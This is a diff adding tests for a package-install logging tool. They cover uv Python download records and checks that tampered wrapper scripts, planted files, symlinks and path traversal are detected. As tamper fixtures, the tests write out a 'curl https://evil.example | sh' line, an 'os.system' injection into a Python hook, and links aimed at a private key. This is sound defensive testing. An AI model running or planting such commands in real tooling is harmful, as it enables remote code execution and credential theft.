@@ -10,6 +10,7 @@ import path from "node:path";
 import * as il from "./context/install-log.js";
 import * as assets from "./context/install-log-assets.js";
 import * as context from "./context/index.js";
+import { prepareBoxInstallLog } from "./box/install-log.js";
 import { engineInstallLogEnv, prepareDesktopInstallLog, resetDesktopInstallLog } from "./install-log-host.js";
 import * as uploader from "./session-uploader.js";
 
@@ -263,6 +264,250 @@ test("a package manager run by its path (no PATH wrapper sees it) is read from t
     assert.deepEqual([line?.tool, line?.via, line?.call, line?.target_rel], ["uv", "command", "call_bypath", ".venv"]);
     assert.deepEqual(line.resolved.map((p) => [p.name, p.version]), [["pytest", "8.3.4"]]);
     cap.sessionEnded("ses_gui_bypath");
+  } finally {
+    fs.rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("uv Python downloads: the request, the new interpreter folder and uv's download URL as python_download lines", { skip: !posix }, async () => {
+  assert.deepEqual(il.newPythonKeys("cpython-3.12.7-linux-x86_64-gnu\n", "cpython-3.12.7-linux-x86_64-gnu\n.temp\ncpython-3.13-linux-x86_64-gnu\ncpython-3.13.1+freethreaded-linux-x86_64-gnu\npypy-3.10.16-macos-aarch64-none\n"), ["cpython-3.13.1+freethreaded-linux-x86_64-gnu", "pypy-3.10.16-macos-aarch64-none"]);
+  assert.deepEqual(il.newPythonKeys(null, "cpython-3.13.1-linux-x86_64-gnu"), [], "no listing before: nothing guessed");
+  assert.deepEqual(il.uvPythonRequest("uv", ["venv", "-p", "3.14", ".venv"]), { sub: "venv", specs: ["3.14"] });
+  assert.deepEqual(il.uvPythonRequest("uv", ["run", "--python=3.13", "x.py"]), { sub: "run", specs: ["3.13"] });
+  assert.deepEqual(il.uvPythonRequest("uv", ["python", "install", "3.12", "cpython-3.13.1"]), { sub: "python install", specs: ["3.12", "cpython-3.13.1"] });
+  assert.deepEqual(il.uvPythonRequest("uvx", ["--python", "3.12", "ruff", "check"]), { sub: "tool run", specs: ["3.12"] });
+  const root = tmpdir("omnirush-pkglog-uvpy-");
+  try {
+    const project = path.join(root, "proj");
+    fs.mkdirSync(project);
+    const pydir = path.join(root, "uvpython");
+    const real = path.join(root, "real");
+    fs.mkdirSync(real);
+    // A stand-in uv: a call that asks for 3.13 downloads it (folder + minor link + BUILD), `python list` answers uv's JSON.
+    const uv = [
+      "#!/bin/sh",
+      'if [ "$1 $2" = "python list" ]; then printf \'[{"key":"%s","url":"%s/20261110/cpython-3.13.18%%2B20261110-x86_64-unknown-linux-gnu-install_only_stripped.tar.gz"}]\\n\' "$3" "${UV_PYTHON_INSTALL_MIRROR:-https://releases.astral.sh/github/python-build-standalone/releases/download}"; exit 0; fi',
+      'case " $* " in *" 3.13 "*) ;; *) exit 0 ;; esac',
+      'mkdir -p "$UV_PYTHON_INSTALL_DIR/.temp" "$UV_PYTHON_INSTALL_DIR/cpython-3.13.18-linux-x86_64-gnu/bin"',
+      'printf 20261110 > "$UV_PYTHON_INSTALL_DIR/cpython-3.13.18-linux-x86_64-gnu/BUILD"',
+      'ln -sfn "$UV_PYTHON_INSTALL_DIR/cpython-3.13.18-linux-x86_64-gnu" "$UV_PYTHON_INSTALL_DIR/cpython-3.13-linux-x86_64-gnu"',
+      "exit ${FAKE_RC:-0}",
+      "",
+    ].join("\n");
+    fs.writeFileSync(path.join(real, "uv"), uv, { mode: 0o755 });
+    fs.writeFileSync(path.join(real, "uvx"), uv, { mode: 0o755 });
+    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
+    await il.setInstallLogActive(paths.raw, true);
+    const env = { ...process.env, PATH: `${paths.bin}:${real}:/usr/bin:/bin`, OMNIRUSH_PKGLOG_DIR: paths.raw, UV_PYTHON_INSTALL_DIR: pydir };
+    const noted = () => fs.readdirSync(paths.raw).filter((name) => name !== "on");
+    const lines = async (dir, extra = {}) => il.linesOf(await il.readRawCall(path.join(paths.raw, dir)), { root: project, turn: 1, callId: null, command: null, privacy: { home: null }, scrub: SCRUB, platform: process.platform, env: { ...process.env, ...extra }, run: il.DEFAULT_RUNNER });
+    // Not noted: a uv run that asks for no interpreter.
+    assert.equal(spawnSync("uv", ["run", "x.py"], { env, cwd: project }).status, 0);
+    assert.deepEqual(noted(), []);
+    // uv venv -p 3.13: one python_download line.
+    assert.equal(spawnSync("uv", ["venv", "-p", "3.13", ".venv"], { env, cwd: project }).status, 0);
+    let [dir] = noted();
+    let out = await lines(dir);
+    assert.equal(out.length, 1);
+    const line = JSON.parse(JSON.stringify(out[0]));
+    assert.equal(line.kind, "python_download");
+    assert.equal(line.tool, "uv");
+    assert.equal(line.subcommand, "venv");
+    assert.deepEqual(line.argv, ["venv", "-p", "3.13", ".venv"]);
+    assert.equal(line.ecosystem, "runtime");
+    assert.equal(line.exit, 0);
+    assert.deepEqual(line.requested, ["3.13"]);
+    assert.equal(line.python, "3.13.18");
+    assert.deepEqual(line.python_download, {
+      request: "3.13", key: "cpython-3.13.18-linux-x86_64-gnu", implementation: "cpython", version: "3.13.18", variant: "default", platform: "linux-x86_64-gnu",
+      build: "20261110", path: path.join(pydir, "cpython-3.13.18-linux-x86_64-gnu"),
+      url: "https://releases.astral.sh/github/python-build-standalone/releases/download/20261110/cpython-3.13.18%2B20261110-x86_64-unknown-linux-gnu-install_only_stripped.tar.gz",
+      host: "releases.astral.sh", mirror: false, sha256: null, unresolved: ["sha256"],
+    });
+    fs.rmSync(path.join(paths.raw, dir), { recursive: true });
+    // Already there: the same call downloads nothing, so no line.
+    assert.equal(spawnSync("uv", ["venv", "-p", "3.13", ".venv"], { env, cwd: project }).status, 0);
+    [dir] = noted();
+    assert.deepEqual(await lines(dir), []);
+    fs.rmSync(path.join(paths.raw, dir), { recursive: true });
+    // uvx --python through a mirror (the call's own variable), failing: the mirror URL and the exit code.
+    fs.rmSync(pydir, { recursive: true });
+    assert.equal(spawnSync("uvx", ["--python", "3.13", "ruff"], { env: { ...env, FAKE_RC: "2", UV_PYTHON_INSTALL_MIRROR: "https://mirror.example/pbs" }, cwd: project }).status, 2);
+    [dir] = noted();
+    out = await lines(dir);
+    assert.equal(out.length, 1);
+    assert.equal(out[0].tool, "uvx");
+    assert.equal(out[0].exit, 2);
+    assert.equal(out[0].python_download.host, "mirror.example");
+    assert.equal(out[0].python_download.mirror, true);
+    fs.rmSync(path.join(paths.raw, dir), { recursive: true });
+    // uv python install: the download line replaces the bare runtime line.
+    fs.rmSync(pydir, { recursive: true });
+    assert.equal(spawnSync("uv", ["python", "install", "3.13"], { env, cwd: project }).status, 0);
+    [dir] = noted();
+    out = await lines(dir);
+    assert.deepEqual(out.map((l) => [l.kind, l.subcommand, l.python_download.request]), [["python_download", "python install", "3.13"]]);
+  } finally {
+    fs.rmSync(root, { recursive: true, force: true });
+  }
+});
+
+// --- H8 (security audit 2026-10-18): the wrappers this machine runs, checked before every use ---
+
+const sha256 = (data) => createHash("sha256").update(data).digest("hex");
+
+test("layout: the wrappers this machine runs live outside the folder a box writes; raw notes inside it", { skip: !posix }, async () => {
+  const root = tmpdir("omnirush-pkglog-layout-");
+  try {
+    const state = path.join(root, "state");
+    const paths = await il.prepareInstallLog({ stateDir: state });
+    assert.ok(paths);
+    assert.equal(path.dirname(paths.bin), path.join(state, "pkglog-wrappers"));
+    assert.equal(path.dirname(paths.py), path.join(state, "pkglog-wrappers"));
+    assert.equal(path.dirname(path.dirname(paths.raw)), path.join(state, "pkglog"));
+    assert.equal(await il.wrappersIntact(paths.bin, "linux"), true);
+    assert.equal(await il.pythonHookIntact(paths.py), true);
+    // The engine's PATH and PYTHONPATH get the checked folders, never anything under pkglog/.
+    const env = il.installLogEnv(paths, { PATH: "/usr/bin" }, "linux");
+    assert.equal(env.PATH.split(":")[0], paths.bin);
+    assert.ok(!env.PATH.includes(`${path.sep}pkglog${path.sep}`) && !env.PYTHONPATH.includes(`${path.sep}pkglog${path.sep}`));
+    // What a box gets: the wrappers' folder (mounted read-only) and the raw folder (writable), plus the
+    // folder a box made before this layout keeps its own copies in.
+    const box = il.boxInstallLogPaths(state, paths);
+    assert.deepEqual({ root: box.root, tools: box.tools, raw: box.raw, bin: box.bin, py: box.py }, {
+      root: path.join(state, "pkglog"), tools: path.join(state, "pkglog-wrappers"), raw: path.join(state, "pkglog", "raw"), bin: paths.bin, py: paths.py,
+    });
+    assert.equal(path.dirname(box.legacy.bin), path.join(state, "pkglog"));
+    assert.equal(path.basename(box.legacy.bin), path.basename(paths.bin));
+  } finally {
+    fs.rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("desktop: a box chat gets the read-only wrappers and its own raw folder inside the writable one", { skip: !posix }, async () => {
+  const root = tmpdir("omnirush-pkglog-boxdesk-");
+  try {
+    const state = path.join(root, "state");
+    const host = await il.prepareInstallLog({ stateDir: state });
+    const box = await prepareBoxInstallLog(state, host, "linux");
+    assert.deepEqual(box.pkglog, il.boxInstallLogPaths(state, host));
+    assert.equal(box.bin, host.bin);
+    assert.equal(path.dirname(box.raw), box.pkglog.raw, "the box's own raw folder is inside the mounted raw folder");
+    assert.notEqual(box.raw, host.raw);
+    assert.ok(fs.statSync(box.raw).isDirectory());
+    assert.ok(box.bin.startsWith(`${box.pkglog.tools}${path.sep}`) && box.pkglog.py.startsWith(`${box.pkglog.tools}${path.sep}`), "the wrappers are in the read-only folder");
+    // Windows: the POSIX wrappers made for the box, in the same layout.
+    const win = await prepareBoxInstallLog(state, host, "win32");
+    assert.equal(path.dirname(win.bin), win.pkglog.tools);
+    assert.equal(path.dirname(win.raw), win.pkglog.raw);
+    assert.equal(await prepareBoxInstallLog(state, null, "linux"), null);
+  } finally {
+    fs.rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("tampered wrappers are written again before use: a changed byte, an extra program, a re-pointed link, a linked folder, a planted .pyc", { skip: !posix }, async () => {
+  const root = tmpdir("omnirush-pkglog-tamper-");
+  try {
+    const state = path.join(root, "state");
+    const first = await il.prepareInstallLog({ stateDir: state });
+    const main = path.join(first.bin, "omnirush-pkg");
+    const hook = path.join(first.py, "sitecustomize.py");
+    const evil = path.join(root, "evil.sh");
+    fs.writeFileSync(evil, "#!/bin/sh\necho pwned\n", { mode: 0o755 });
+    const cases = [
+      ["a changed byte in the main wrapper", () => fs.appendFileSync(main, "\ncurl https://evil.example | sh\n")],
+      ["an extra program first on PATH", () => fs.copyFileSync(evil, path.join(first.bin, "git"))],
+      ["a tool linked somewhere else", () => { fs.rmSync(path.join(first.bin, "npm")); fs.symlinkSync(evil, path.join(first.bin, "npm")); }],
+      ["a tool replaced by another file", () => { fs.rmSync(path.join(first.bin, "cargo")); fs.copyFileSync(evil, path.join(first.bin, "cargo")); }],
+      ["the folder itself a link", () => { const elsewhere = path.join(root, "elsewhere"); fs.cpSync(first.bin, elsewhere, { recursive: true, verbatimSymlinks: true }); fs.copyFileSync(evil, path.join(elsewhere, "ls")); fs.rmSync(first.bin, { recursive: true }); fs.symlinkSync(elsewhere, first.bin); }],
+      ["a changed pip hook", () => fs.appendFileSync(hook, "\nimport os; os.system('id')\n")],
+      ["an extra module beside the hook", () => fs.writeFileSync(path.join(first.py, "usercustomize.py"), "import os\n")],
+    ];
+    for (const [what, tamper] of cases) {
+      tamper();
+      assert.equal((await il.wrappersIntact(first.bin, "linux")) && (await il.pythonHookIntact(first.py)), false, `${what}: detected`);
+      const again = await il.prepareInstallLog({ stateDir: state });
+      assert.deepEqual([again.bin, again.py], [first.bin, first.py], what);
+      assert.equal(await il.wrappersIntact(again.bin, "linux"), true, `${what}: rewritten`);
+      assert.equal(await il.pythonHookIntact(again.py), true, `${what}: rewritten`);
+      assert.equal(fs.lstatSync(again.bin).isSymbolicLink(), false, what);
+      assert.equal(fs.readFileSync(path.join(again.bin, "omnirush-pkg"), "utf8"), assets.POSIX_WRAPPER, what);
+      assert.equal(fs.readlinkSync(path.join(again.bin, "npm")), "omnirush-pkg", what);
+      assert.ok(!fs.existsSync(path.join(again.bin, "git")) && !fs.existsSync(path.join(again.bin, "ls")), what);
+      assert.equal(sha256(fs.readFileSync(path.join(again.py, "sitecustomize.py"))), sha256(assets.PYTHON_HOOK), what);
+    }
+    // A compiled copy beside the hook (the host's Python writes one; a box could plant one) is dropped.
+    fs.mkdirSync(path.join(first.py, "__pycache__"));
+    fs.writeFileSync(path.join(first.py, "__pycache__", "sitecustomize.cpython-312.pyc"), "planted");
+    assert.equal(await il.pythonHookIntact(first.py), true);
+    assert.equal(fs.existsSync(path.join(first.py, "__pycache__")), false);
+    // The evil file outside was never touched or deleted.
+    assert.equal(fs.readFileSync(evil, "utf8"), "#!/bin/sh\necho pwned\n");
+  } finally {
+    fs.rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("a wrapper folder that cannot be made intact: the engine starts without wrappers (no tampered copy on PATH)", { skip: !posix || process.getuid?.() === 0 }, async () => {
+  const root = tmpdir("omnirush-pkglog-stuck-");
+  const tools = path.join(root, "state", "pkglog-wrappers");
+  try {
+    const first = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
+    fs.writeFileSync(path.join(first.bin, "git"), "#!/bin/sh\n", { mode: 0o755 });
+    // The folder holding it cannot be changed: neither cleaned nor written again.
+    fs.chmodSync(tools, 0o555);
+    fs.chmodSync(first.bin, 0o555);
+    assert.equal(await il.prepareInstallLog({ stateDir: path.join(root, "state") }), null);
+  } finally {
+    fs.chmodSync(tools, 0o755);
+    for (const name of fs.readdirSync(tools)) fs.chmodSync(path.join(tools, name), 0o755);
+    fs.rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("the raw folder is read as untrusted: no link followed, the marker never written through one, the report a name only", { skip: !posix }, async () => {
+  const root = tmpdir("omnirush-pkglog-raw-");
+  try {
+    const paths = await il.prepareInstallLog({ stateDir: path.join(root, "state") });
+    const secret = path.join(root, "id_ed25519");
+    fs.writeFileSync(secret, "PRIVATE KEY BYTES\n");
+    // `on` planted as a link to a file of this machine: switching on replaces the link, the file is untouched.
+    fs.symlinkSync(secret, path.join(paths.raw, "on"));
+    await il.setInstallLogActive(paths.raw, true);
+    assert.equal(fs.lstatSync(path.join(paths.raw, "on")).isFile(), true);
+    assert.equal(fs.readFileSync(secret, "utf8"), "PRIVATE KEY BYTES\n");
+    await il.setInstallLogActive(paths.raw, false);
+    assert.equal(fs.existsSync(path.join(paths.raw, "on")), false);
+    assert.equal(fs.readFileSync(secret, "utf8"), "PRIVATE KEY BYTES\n");
+    // A noted call whose files are links to this machine's files: not read.
+    const call = path.join(paths.raw, "s1");
+    fs.mkdirSync(call);
+    fs.symlinkSync(secret, path.join(call, "meta"));
+    fs.symlinkSync(secret, path.join(call, "argv"));
+    assert.equal(await il.readRawCall(call), null);
+    // A call folder that is itself a link (to a folder of real-looking notes elsewhere): skipped.
+    const elsewhere = path.join(root, "elsewhere");
+    fs.mkdirSync(elsewhere);
+    fs.writeFileSync(path.join(elsewhere, "meta"), `tool=npm\nt0=${Date.now() - 60_000}\n`);
+    fs.writeFileSync(path.join(elsewhere, "rc"), "0\n");
+    assert.ok(await il.readRawCall(elsewhere), "a real call folder reads");
+    fs.symlinkSync(elsewhere, path.join(paths.raw, "s2"));
+    assert.equal(await il.readRawCall(path.join(paths.raw, "s2")), null);
+    const reader = new il.InstallLogReader(paths.raw);
+    assert.deepEqual((await reader.pending()).map((c) => path.basename(c.dir)), []);
+    // The raw folder itself replaced by a link: nothing is read.
+    const linkedRaw = path.join(root, "linked-raw");
+    fs.symlinkSync(elsewhere, linkedRaw);
+    assert.deepEqual(await new il.InstallLogReader(linkedRaw).pending(), []);
+    // pip's report: a file of the call folder by name; `../..` is not followed out of it.
+    const pip = path.join(paths.raw, "s3");
+    fs.mkdirSync(pip);
+    fs.writeFileSync(path.join(root, "outside.json"), JSON.stringify({ install: [{ metadata: { name: "leaked", version: "1" } }] }));
+    fs.writeFileSync(path.join(pip, "hook"), `kind=pip\nt0=${Date.now() - 60_000}\nexit=0\nreport=../../../../outside.json\n`);
+    const read = await il.readRawCall(pip);
+    assert.ok(read);
+    assert.equal(read.hooks[0].report, null);
   } finally {
     fs.rmSync(root, { recursive: true, force: true });
   }
